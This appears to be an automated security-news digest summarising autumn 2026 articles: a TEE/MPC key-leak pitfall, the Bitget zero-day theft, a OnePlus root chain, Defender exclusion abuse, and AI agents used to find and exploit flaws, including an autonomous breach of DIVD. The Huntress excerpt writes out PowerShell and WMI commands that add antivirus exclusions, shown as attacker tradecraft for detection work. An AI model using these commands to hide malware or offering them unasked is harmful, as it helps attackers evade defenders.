#### Primary article taxonomy
- affected_industries: manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Threshold signature schemes, a form of multi-party computation (MPC) that lets a set of parties sign together without any one of them holding the key, are increasingly deployed inside trusted execution environments (TEEs). The combination is intended to amplify security for sensitive computations: MPC distributes trust across multiple independent parties, while TEEs root trust in the hardware manufacturer and its attestation infrastructure. But subtle issues can arise when running an MPC protocol inside a TEE without accounting for the untrusted host: for example, a malicious host could roll back the filesystem state after a threshold signer deletes a used pre-signature, causing the signer to reuse their nonce share and disclose their private key share. So is this combination worth it? Provided you treat the TEE as a defense-in-depth layer rather than a substitute for a sound protocol, the answer is yes. This blog post discusses what TEE attestation can and can’t fix in MPC deployments
```

#### Full body

```
Page content Threshold signature schemes, a form of multi-party computation (MPC) that lets a set of parties sign together without any one of them holding the key, are increasingly deployed inside trusted execution environments (TEEs). The combination is intended to amplify security for sensitive computations: MPC distributes trust across multiple independent parties, while TEEs root trust in the hardware manufacturer and its attestation infrastructure. But subtle issues can arise when running an MPC protocol inside a TEE without accounting for the untrusted host: for example, a malicious host could roll back the filesystem state after a threshold signer deletes a used pre-signature, causing the signer to reuse their nonce share and disclose their private key share. So is this combination worth it? Provided you treat the TEE as a defense-in-depth layer rather than a substitute for a sound protocol, the answer is yes. This blog post discusses what TEE attestation can and can’t fix in MPC deployments, explores the pitfalls we see most often in audits, and covers best practices, such as incorporating strong attestation processes and binding them to the MPC parties’ identities. MPC: Security that depends on participant behavior Before diving into how TEEs and MPC interact, we need to understand what MPC means and what security guarantees it offers. MPC is a cryptographic technique that allows multiple parties to jointly compute a function over their private inputs without revealing those inputs to each other. The security of MPC protocols depends critically on assumptions about participant behavior. The cryptographic literature uses two primary security models: Semi-honest (honest-but-curious) security : In this model, all participants follow the protocol exactly as specified, but they may try to learn additional information from the messages they receive during the protocol execution. Participants can try to learn more than they should, but they don’t deviate from the protocol specification. Malicious security : This stronger model assumes participants may deviate arbitrarily from the protocol. A malicious participant might send incorrectly computed values, use wrong inputs, abort the protocol at strategic moments, and behave in ways designed to compromise security or learn private information. This distinction is important in the context of TEEs. If a TEE attestation can cryptographically guarantee that all parties are running the correct protocol implementation, it effectively elevates semi-honest protocols to provide malicious security guarantees (at least against certain classes of attacks, as we’ll discuss later). But before delving into the details, let’s discuss how TEEs work. TEEs: Three core security guarantees TEEs are secure areas within a processor that provide hardware-based protection for code and data, even from privileged software like operating systems or hypervisors. TEEs offer three core security guarantees: Confidentiality : Data and code are encrypted in memory and accessible only from within the TEE. This ensures that even privileged system software cannot inspect the contents of the secure computation. Integrity : The data and code are protected from tampering. Any attempt to modify the TEE’s memory or execution state from outside should be detected. Attestation : Remote parties can cryptographically verify what code is running in the TEE. This allows external verifiers to gain assurance about the computation being performed and the legitimacy of the TEE without trusting the host system. This last property is particularly crucial for building distributed systems with TEEs. How TEE attestation works The attestation mechanism is at the heart of TEE security. When a TEE is manufactured, it’s provisioned with a private key and a corresponding certificate that chains back to a root certificate held by a trust anchor (typically the manufacturer). When an attestation is requested, the TEE takes measurements (crypt
```

#### Corroborating sources (1)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: Don't let TEEs break your MPC
  - Published: 2026-09-25T11:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/09/25/dont-let-tees-break-your-mpc/
  - Summary: Threshold signature schemes, a form of multi-party computation (MPC) that lets a set of parties sign together without any one of them holding the key, are increasingly deployed inside trusted execution environments (TEEs). The combination is intended to amplify security for sensitive computations: MPC distributes trust across multiple independent parties, while TEEs root trust in the hardware manufacturer and its attestation infrastructure. But subtle issues can arise when running an MPC protocol inside a TEE without accounting for the untrusted host: for example, a malicious host could roll back the filesystem state after a threshold signer deletes a used pre-signature, causing the signer to reuse their nonce share and disclose their private key share. So is this combination worth it? Provided you treat the TEE as a defense-in-depth layer rather than a substitute for a sound protocol, the answer is yes. This blog post discusses what TEE attestation can and can’t fix in MPC deployments

### Cluster cb447c53cc — score 10

- Title: Sentinel Envelope Plus adds software protection without source code changes
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-10-01T07:38:00+00:00
- Link: https://www.helpnetsecurity.com/2026/10/01/thales-sentinel-envelope-plus/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Thales has announced Sentinel Envelope Plus, a new addition to its Sentinel Envelope software protection solution that significantly hardens compiled applications against AI-assisted reverse engineering, automated zero-day vulnerability discovery, and automated exploit generation. Sentinel Envelope Plus applies multiple layers of protection to software applications, without requiring source code changes or any special compilation environments. AI-assisted tools are making it faster and easier to analyze software for vulnerabilities, reducing the specialist expertise and time required for … More → The post Sentinel Envelope Plus adds software protection without source code changes appeared first on Help Net Security .
```

#### Full body

```
Industry News October 1, 2026 Share Sentinel Envelope Plus adds software protection without source code changes Thales has announced Sentinel Envelope Plus, a new addition to its Sentinel Envelope software protection solution that significantly hardens compiled applications against AI-assisted reverse engineering, automated zero-day vulnerability discovery, and automated exploit generation. Sentinel Envelope Plus applies multiple layers of protection to software applications, without requiring source code changes or any special compilation environments. AI-assisted tools are making it faster and easier to analyze software for vulnerabilities, reducing the specialist expertise and time required for reverse engineering. This creates new risks for software vendors, particularly when applications are deployed outside environments they control. On-premises, embedded and edge devices are at increased risk, as attackers obtain a copy of the application and can analyze it offline, beyond the vendor’s security environment. This gives them more opportunity to search for vulnerabilities, proprietary algorithms, business logic and other sensitive elements within the software. For mission-critical systems, the consequences can extend beyond data and intellectual property to operational disruption and lasting damage to the vendor’s reputation and customer trust. “AI is dramatically reducing the time and expertise needed to analyze software for vulnerabilities. Our testing shows that the right software protection can make AI-assisted reverse engineering significantly more difficult and resource-intensive,” said Damien Bullot , Vice President, Software Monetization at Thales. “For software vendors, that additional time matters. It creates a larger window to identify issues, deploy fixes and protect customers, while helping safeguard the intellectual property embedded in their applications.” Measured results against AI-assisted analysis Thales conducted a controlled test comparing how an AI agent analyzed the same application before and after protection with Sentinel Envelope Plus. When tasked with analyzing an unprotected application, the agent identified 8 of 10 vulnerabilities. Against the same application protected with Sentinel Envelope Plus, the agent identified none, despite sustained effort and 970 times the token consumption. Even after employing increasingly sophisticated techniques, including generating its own custom analysis tools, the agent ultimately recommended discontinuing the analysis. With no vulnerabilities exposed, there was nothing for an attacker to turn into an exploit. While the vulnerabilities remain in the code, Sentinel Envelope Plus makes them significantly harder to discover and exploit, giving organizations valuable time to detect and remediate issues. Rather than dropping development work to respond to an internally discovered vulnerability, teams can address issues through their planned release cycles, protecting both their product roadmap and their customers. How Sentinel Envelope Plus protects software The new solution extends Thales’ existing Sentinel Envelope software protection capabilities, allowing developers to apply advanced protection to selected security-sensitive parts of an application, without changing its source code or requiring a special development environment. Sentinel Envelope Plus transforms and recompiles selected parts of an application, adding multiple layers of protection against decompilation, tampering and runtime inspection. Developers can choose which parts receive the strongest protection, balancing security with performance. Sentinel Envelope Plus can also combine software protection with optional licensing capabilities, helping vendors protect proprietary algorithms and business logic while safeguarding the license controls that support their commercial models. As with the code protection itself, these license controls can be added without any source code changes. More about Tha
```

#### Corroborating sources (1)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Sentinel Envelope Plus adds software protection without source code changes
  - Published: 2026-10-01T07:38:00+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/01/thales-sentinel-envelope-plus/
  - Summary: Thales has announced Sentinel Envelope Plus, a new addition to its Sentinel Envelope software protection solution that significantly hardens compiled applications against AI-assisted reverse engineering, automated zero-day vulnerability discovery, and automated exploit generation. Sentinel Envelope Plus applies multiple layers of protection to software applications, without requiring source code changes or any special compilation environments. AI-assisted tools are making it faster and easier to analyze software for vulnerabilities, reducing the specialist expertise and time required for … More → The post Sentinel Envelope Plus adds software protection without source code changes appeared first on Help Net Security .

### Cluster cb3b90cdc3 — score 10

- Title: Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T05:21:10+00:00
- Link: https://thehackernews.com/2026/10/bitget-confirms-third-party-zero-day.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor, zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cryptocurrency exchange Bitget on Wednesday confirmed that attackers who stole $387.5 million last week exploited a zero-day flaw in third-party security products, citing ongoing investigation findings from SlowMist. "Their investigation identified malicious activity involving third-party security products, including a zero-day vulnerability, and recovered a customized tool used by the attacker
```

#### Full body

```
Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft  Ravie Lakshmanan  Oct 01, 2026 Vulnerability / Zero-Day Cryptocurrency exchange Bitget on Wednesday confirmed that attackers who stole $387.5 million last week exploited a zero-day flaw in third-party security products, citing ongoing investigation findings from SlowMist. "Their investigation identified malicious activity involving third-party security products, including a zero-day vulnerability, and recovered a customized tool used by the attacker to initiate unauthorized withdrawals," Bitget said in a post on X. On September 24, 2026, the cryptocurrency exchange disclosed that threat actors stole $387.5 million from its hot and warm wallets through a series of unauthorized transfers, prompting it to halt all withdrawals temporarily. Close to $1.1 million in cryptocurrency assets have been frozen by Circle, Tether, and NEAR Intents. In a subsequent analysis , Bitget said the attackers exploited the flaw to obtain high-level internal credentials and use them to issue fraudulent withdrawal commands to the wallet system and initiate "abnormal transfers that bypassed existing risk controls." Bitget has since notified the relevant third-party vendor and disabled the affected functionality pending completion of a fix. The incident impacted 11 blockchains, including Ethereum, XRP Ledger, Zcash, TRON, Arbitrum, Optimism, Base, BNB Smart Chain, Avalanche, Algorand, and Celestia. Affected assets identified to date include XRP, ETH, USDT, ZEC, ATOM, USDC, USD0, XAUt, BNB, AVAX, TRX, ALGO, and TIA. According to a new progress report published by SlowMist, the earliest malicious activity linked to the hack dates back to August 31, 2026. "A service running on one of Product A's nodes was affected by a zero-day vulnerability," the company said . "The attacker ran a hidden script under the service process, launched a command to read the environment variable containing the database password, and connected to the database." "Similar hidden-script activity was observed on two other nodes on September 23 and September 25. These findings show that the affected service environments had already been compromised before the assets were transferred out." Then, on September 25, 2026, the threat actor is said to have accessed another product's (named Product B) management platform by using an internal employee's identity and making three consecutive attempts to inject system commands into the product's task parameters to write malicious files. "The attacker subsequently submitted code through the platform's web execution endpoint, attempting to modify server configuration, write a communication relay file, and upload and assemble malicious program files in batches," the blockchain security company added. Another key finding relates to the threat actor's use of a bespoke tool to siphon the assets. SlowMist said the program was among the deleted files it had recovered. Highly tailored to the wallet system's withdrawal logic, the tool began running and executing cryptocurrency theft at 01:49 a.m on September 25, 2026. Google-owned Mandiant's probe into the incident has found that the attackers gained unauthorized access to certain third-party security appliances (i.e., A and B), and then leveraged that access to move laterally into Bitget's wallet environment. "The threat actor deployed a web shell onto the security appliance B and established a Command-and-Control (C2) connection," Mandiant said . "Using the persistent access on security appliance B, the threat actor moved laterally to Bitget's production wallet job server and deployed malicious packages." "The threat actor compromised network and security appliances and leveraged them to distribute malicious packages and gain control over the wallet job server." Bitget said IP behavior patterns and on-chain analysis indicate the attack was carried out by North Korean threat actors, with Elliptic and TRM Labs uncovering wa
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft
  - Published: 2026-10-01T05:21:10+00:00
  - Link: https://thehackernews.com/2026/10/bitget-confirms-third-party-zero-day.html
  - Summary: Cryptocurrency exchange Bitget on Wednesday confirmed that attackers who stole $387.5 million last week exploited a zero-day flaw in third-party security products, citing ongoing investigation findings from SlowMist. "Their investigation identified malicious activity involving third-party security products, including a zero-day vulnerability, and recovered a customized tool used by the attacker

### Cluster 793f25a293 — score 10

- Title: Unpatched OnePlus Flaws Let Installed Android Apps Gain Root Without Permissions
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-24T18:10:18+00:00
- Link: https://thehackernews.com/2026/09/unpatched-oneplus-flaws-let-installed.html
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: Android

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- affected_industries: financial_services, legal_professional
- affected_products: Android
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- affected_industries: legal_professional
- affected_products: Android
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A OnePlus 15 running the latest OxygenOS can be rooted by a malicious app the owner installs, one that asks for no special permissions. A researcher, Rasmus Moorats, chained two flaws in OnePlus's own software to gain root access, the highest level of control over an Android phone. OnePlus told him the same flaws affect many more of its own devices and those of OPPO, though it has not
```

#### Full body

```
Unpatched OnePlus Flaws Let Installed Android Apps Gain Root Without Permissions  Swati Khandelwal  Sep 24, 2026 Vulnerability / Mobile Security A OnePlus 15 running the latest OxygenOS can be rooted by a malicious app the owner installs, one that asks for no special permissions. A researcher, Rasmus Moorats, chained two flaws in OnePlus's own software to gain root access, the highest level of control over an Android phone. OnePlus told him the same flaws affect many more of its own devices and those of OPPO, though it has not said which. OnePlus confirmed both flaws in May. In the same reply, the company told Moorats that it alone decides when to make a flaw public and warned that publishing without its permission could result in legal liability. He published on September 24 anyway, when OnePlus had released no fix. OnePlus set out its position in the reply, which Moorats published in full . It said a fix was scheduled, but claimed "the exclusive final right of vulnerability disclosure," and told him that even after a fix ships, researchers may not publish full technical details on their own. The company argued that European cybersecurity rules require makers to accept and fix reports but do not allow researchers to disclose them without the maker's consent. It warned that if he published without permission, OnePlus would "pursue relevant legal liabilities in accordance with applicable laws." How the Attack Works Moorats found the first flaw in a OnePlus service called AtlasService , which gathers debugging data, runs as root, and accepts calls from any app without checking who is calling. A crafted call reaches a OnePlus debugging tool that takes the app's text and drops it, unchecked, into a system command. That hands the app root, but only within a restricted system zone called dumpstate, which cannot do everything root normally can. The second flaw finishes the job. OnePlus ships another service, a hardware helper called olc2, with a command that executes any shell instruction it receives. Its only guard is that the caller must already be root, which the first flaw provides. This time, the command runs in a zone that grants all low-level Linux privileges, including the ability to load kernel code, giving the app control of the device at the system level. Who Is Affected, and What You Can Do The attack is local. A malicious app has to be installed and running on the phone first, so it cannot be launched over the internet. But once it is there, the app needs no permissions and shows the user no prompt, and it worked on a stock phone Moorats had not modified. There is no evidence that anyone has used the flaws in a real attack. Moorats also confirmed the attack on an older OnePlus 12 Pro, and he expects the same problem across OxygenOS 16 in general. OnePlus and OPPO build their phones on shared software, which is why OnePlus's warning covered both. As of Moorats's disclosure, OnePlus had assigned no CVE and released no fix, and no OnePlus advisory naming the flaws could be found. Until a fix ships, the one practical defense is the thing the attack needs to get started: install apps only from sources you trust, because it cannot run without a malicious app on the phone. By Moorats's account, the disclosure ran over about five months: April 18, 2026: reported both flaws to OnePlus. May 20: OnePlus confirmed them, claimed sole control over disclosure, and warned of legal liability if he published. June 22: OnePlus gave an update on its fix and asked him to hold off, and he agreed not to publish before September 17. July 20 and September 11: he asked for updates and received no reply. September 24: he published. Separately, this is not the only recent case of an installed app reaching root on flagship Android phones. In August, Lukas Maar, a researcher at the security firm Calif, showed a different technique that took a no-permission app to root locked phones running the latest firmware from Samsung, Xiaomi, OPPO, OnePlus, an
```

#### Corroborating sources (3)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Unpatched OnePlus Flaws Let Installed Android Apps Gain Root Without Permissions
  - Published: 2026-09-24T18:10:18+00:00
  - Link: https://thehackernews.com/2026/09/unpatched-oneplus-flaws-let-installed.html
  - Summary: A OnePlus 15 running the latest OxygenOS can be rooted by a malicious app the owner installs, one that asks for no special permissions. A researcher, Rasmus Moorats, chained two flaws in OnePlus's own software to gain root access, the highest level of control over an Android phone. OnePlus told him the same flaws affect many more of its own devices and those of OPPO, though it has not
- **The Record** (cyber_news_breach_reporting)
  - Title: Mobile malware warning from Ukrainian researchers includes iPhone exploit kit
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://therecord.media/ukraine-ssscip-mobile-malware-warning-ios-android
  - Summary: 'Hit and run' iPhone malware known as DarkSword is part of a wave of Russian attacks on iOS and Android devices, according to Ukraine's SSSCIP.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: RemControl Banking Trojan Gives Attackers Remote Control of Android Devices
  - Published: 2026-09-25T09:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/banking-trojan-remote-control/
  - Summary: The newly-discovered trojan abuses the Android Accessibility Service to gain control over victim devices and collect sensitive banking credentials

### Cluster 10265ec447 — score 9

- Title: Wireshark 4.6.9 Released, (Sun, Sep 27th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-27T15:04:49+00:00
- Link: https://isc.sans.edu/diary/rss/33372
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Wireshark release 4.6.9 fixes 19 vulnerabilities and 16 bugs.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Wireshark 4.6.9 Released, (Sun, Sep 27th)
  - Published: 2026-09-27T15:04:49+00:00
  - Link: https://isc.sans.edu/diary/rss/33372
  - Summary: Wireshark release 4.6.9 fixes 19 vulnerabilities and 16 bugs.

### Cluster 8d54e235f9 — score 9

- Title: A Closer Look at Malware From the Macfinger ClickFix Campaign, (Fri, Sep 25th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-25T12:45:19+00:00
- Link: https://isc.sans.edu/diary/rss/33368
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Introduction
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: A Closer Look at Malware From the Macfinger ClickFix Campaign, (Fri, Sep 25th)
  - Published: 2026-09-25T12:45:19+00:00
  - Link: https://isc.sans.edu/diary/rss/33368
  - Summary: Introduction

### Cluster 530d7cb170 — score 9

- Title: Defender Exclusion Abuse: How Attackers Hide Malware from MDAV
- Source: Huntress (detection_response_operations)
- Published: 2026-09-30T17:30:00+00:00
- Link: https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
See how attackers like GootKit and WhisperGate abuse Windows Defender exclusions to hide malware from AV scans — and how Huntress detects it.
```

#### Full body

```
Home Blog You Can Run, but You Can’t Hide: Defender Exclusions Last Updated: September 30, 2026 You Can Run, but You Can’t Hide: Defender Exclusions By: Jonathan Johnson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI The endpoint team at Huntress is focused on providing telemetry and protections around real adversary threats. One thing we've noticed that's often overlooked is adversaries leveraging Microsoft Defender Antivirus (MDAV) settings to circumvent scans on their malicious binaries. Obviously, turning off Defender completely is ideal for adversaries, but the setting we’re going to discuss today is MDAV exclusions. Exclusions are a capability that Microsoft has exposed. They allow a user with administrator privileges or higher to circumvent AV scans on folders, binaries, and IP addresses. Depending on the use case, an attacker can leverage Exclusions more stealthily than shutting the antivirus down completely. Before we dive into the adversary tradecraft, let’s take a look into the internals of MDAV exclusions. Microsoft supports four types of Antivirus exclusions , which support different actions on the exclusions: Types of windows defender exclusions Exclusion Type Description Process Disables real-time scanning on files that are opened by specific processes, i.e., specified (source) process is not scanned. Path Excludes entire file paths from real-time/scheduled scans. Extension Disables real-time/scheduled/custom scans on certain file extensions. IpAddress Disables network packet inspection incoming from a certain IP. There are a few different ways someone can interact with MDAV exclusions: PowerShell ( Set-MpPreference / Add-MpPreference ) WMI ( MSFT_MpPreference Class) Group Policy (GPO) Direct Registry Modification When someone sets an exclusion via PowerShell, the call execution goes through the MSFT_MpPreference WMI Class. Then it makes its way through COM & RPC to eventually transition execution to MsMpEng.exe (the MDAV binary). MsMpEng.exe then makes a registry modification to the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions registry key. If someone creates an exclusion via a GPO, the execution flow often goes through the GPO svchost ( C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc ) which sets a registry value within the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions . Note: This is a different registry key than the one that MsMpEng.exe modifies. However, whenever someone tries to query the Defender exclusions, it will query the exclusions set by GPO and MDAV. Figure 1 shows a ProcMon result while running (Get-MpPreference).ExclusionPath in PowerShell. Figure 1: Registry activity shown by ProcMon Now that we understand MDAV exclusions a little bit better, let's dive into attacker tradecraft. How Attackers abuse defender exclusions As you can probably tell, exclusions are a great way to circumvent MDAV scans, and the two types of exclusions that are most used and valuable to an attacker are Path and Extension exclusions. When those two exclusions are set, the path/process that matches that exclusion is removed from scheduled scans, on-demand scans, and always-on, real-time protection and monitoring. We see this with the following adversary campaigns: GootKit - 2019 Creates an MDAV path exclusion via the MSFT_MpPreference WMI Class. WhisperGate - 2022 Creates an MDAV path exclusion for the C:\ Drive via PowerShell’s Set-MpPreference CmdLet Muddled Libra - 2024 As mentioned above, plenty of ways exist to create an entry into the exclusion policy—PowerShell, WMI, GPO, and direct registry modification. Let’s take a look at an example of each: PowerShell: Set-MpPreference : Set-MpPreference -ExclusionPath C:\Temp Add-MpPreference : Add-MpPreference -ExclusionPath C:\Temp WMI: Add Method in MSFT_MpPreference Class : Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Add -Arguments
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Defender Exclusion Abuse: How Attackers Hide Malware from MDAV
  - Published: 2026-09-30T17:30:00+00:00
  - Link: https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions
  - Summary: See how attackers like GootKit and WhisperGate abuse Windows Defender exclusions to hide malware from AV scans — and how Huntress detects it.

### Cluster 25a206d1e0 — score 9

- Title: Google: Vulnerability disclosures double to 10,000 per month as AI fuels exploitation
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-09-30T19:00:00+00:00
- Link: https://therecord.media/google-vulnerabilities-cyberattacks-ai
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure
- affected_industries: government
- cve_ids: CVE-2026-1731
- urgency_signals: actively_exploited, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure, active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-1731
- urgency_signals: actively_exploited, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Vulnerability disclosures continue to skyrocket, doubling over the course of the year to more than 10,000 each month, Google researchers warned.
```

#### Full body

```
Image: Getty via Unsplash+ Google: Vulnerability disclosures double to 10,000 per month as AI fuels exploitation Vulnerability disclosures doubled between January and August, reaching a new peak of 10,740 last month, Google’s Threat Intelligence Group (GTIG) said Wednesday. Total vulnerability disclosures began the year at 5,045 in January and had jumped to more than 10,000 for July and August. “We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered,” the researchers said. They noted that beyond the overall number of bugs being found, the number of distinct vulnerabilities disclosed and exploited during the eight month period surpassed the totals for all of 2025. There have already been 141 exploited vulnerabilities this year after 127 last year. In a report on Wednesday, GTIG said the increase in vulnerability exploitation in 2026 “is driven by the rapid, targeted weaponization of high-risk exploits in the wild rather than a flood of new zero-days.” Zero-days are vulnerabilities that are exploited before they are known to vendors and n-days are vulnerabilities that have been patched and publicly disclosed. The researchers found that hackers are getting better at using artificial intelligence to scan patches and exploit critical bugs. Kelli Vanderlee, senior analyst at GTIG, said they expect that AI-assisted vulnerability discovery and exploitation will continue to grow in the short-to medium-term. “It is possible that threat actors are finding it more accessible or efficient to use LLMs and AI tools to automate analysis of differences between product versions, patches, vulnerability disclosure announcements, and Proof-of-Concept (POC) code to rapidly weaponize n-days, rather than to discover new zero-days,” the researchers said. As an example, Google pointed to CVE-2026-1731 — a vulnerability in BeyondTrust software spotlighted by federal cyber defenders in February. The bug was found autonomously by a third-party research agent Hacktron AI. After it was disclosed, Google’s researchers said it saw threat actors “weaponize this vulnerability in targeted initial-access campaigns to bypass enterprise perimeters.” “More specifically, within four days of public disclosure, GTIG observed a threat cluster exploiting this vulnerability, followed by five additional threat clusters within seven days of public disclosure,” they said. “GTIG observed these threat actors collectively conduct a variety of post-exploitation activities, including privilege escalation, data exfiltration, and dropping secondary payloads including SNOWLIGHT, SPARKRAT, and cryptominers.” The case illustrated that when directed at critical attack surfaces, autonomous research agents “demonstrate a formidable capacity to uncover high-severity flaws.” AI agents are being used mostly to find medium and high-risk vulnerabilities. Vanderlee said they classify a bug as high-risk if exploitation would enable attackers to have a notable, direct impact to the security of targeted devices and networks without needing to overcome any major mitigating factors. “Reliability of exploitation is expected to be high and can typically be done on a wide scale," she added. The researchers said many of the disclosures this year have come from a handful of vendors, including router firmware company Totolink and Oracle. Threat actors continue to focus exploitation activity on perimeter appliances and exposed enterprise services, with 14% of vulnerabilities exploited between January and August affecting edge and security appliances. The report mirrors findings released last week by the Cybersecurity and Infrastructure Security Agency (CISA) that more than 67,000 new CVEs have been published in 2026. Experts project a total of 96,000 new CVEs by the end of the year. The National Institute of Standards and Technology’s National Vulnerability Database pro
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: Google: Vulnerability disclosures double to 10,000 per month as AI fuels exploitation
  - Published: 2026-09-30T19:00:00+00:00
  - Link: https://therecord.media/google-vulnerabilities-cyberattacks-ai
  - Summary: Vulnerability disclosures continue to skyrocket, doubling over the course of the year to more than 10,000 each month, Google researchers warned.

### Cluster dc4b00bf73 — score 9

- Title: DIVD says Zammad zero-days enabled AI-driven network breach
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-30T19:49:15+00:00
- Link: https://www.bleepingcomputer.com/news/security/divd-says-zammad-zero-days-enabled-ai-driven-network-breach/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach, vulnerability_disclosure, zero_day
- cve_ids: CVE-2026-102489, CVE-2026-102490
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, zero_day, data_breach, vulnerability_disclosure
- cve_ids: CVE-2026-102489, CVE-2026-102490
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The Dutch Institute for Vulnerability Disclosure (DIVD) says that the breach of its network was possible by exploiting a chain of two zero-day vulnerabilities in the open-source Zammad ticketing system. [...]
```

#### Full body

```
DIVD says Zammad zero-days enabled AI-driven network breach By Bill Toulas September 30, 2026 03:49 PM 0 The Dutch Institute for Vulnerability Disclosure (DIVD) says that the breach of its network was possible by exploiting a chain of two zero-day vulnerabilities in the open-source Zammad ticketing system. Previously, the nonprofit organization of volunteer security researchers said the attack was “loud and very, very messy,” driven by an AI agent that moved autonomously and decided its next steps without external intervention or direction. DIVD retrieved extensive details about the attack because the AI agent left behind clear explanations of its decisions, allowing the organization to reconstruct the incident. According to the cybersecurity nonprofit, the two flaws, now identified as CVE-2026-102489 and CVE-2026-102490, enabled session hijacking, remote code execution, and escalation to root privileges. After exploiting the vulnerabilities, the attacker was able to access other services, read and exfiltrate data from DIVD's systems, all actions performed in a matter of seconds, thanks to AI automation. “Used together, they allowed the attackers to hijack sessions, run code remotely, and escalate privileges from the Zammad user to root, in seconds, due to the agentic part of this hack,” DIVD says . Due to network segmentation and incident response actions, the threat actor did not move deeper into the network. However, the investigation is still underway. Zammad is an open-source AI-powered helpdesk and support ticketing platform used to manage customer inquiries, IT support requests, and internal ticketing. The solution is available as a self-hosted or hosted service, and Zammad claims on its website that it has over 2,000 customers and 55,000 users, including De’Longhi, Amnesty International, and NextCloud. DIVD discovered the zero-day vulnerabilities in collaboration with Merlon Security. The organization notified Zammad about the issue and is alerting other users of vulnerable instances. The nonprofit recommends that Zammad users upgrade to version 7, which is considered safe, or take the instance offline as soon as possible. DIVD has promised to share additional updates about the incident tomorrow. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Automated AI agent used to breach cybersecurity nonprofit DIVD Spain's data agency gets first report of AI-powered data breach Hackers build AI frameworks for widescale credential theft AI's Third Wave: Coworkers Break the Security Model That Worked 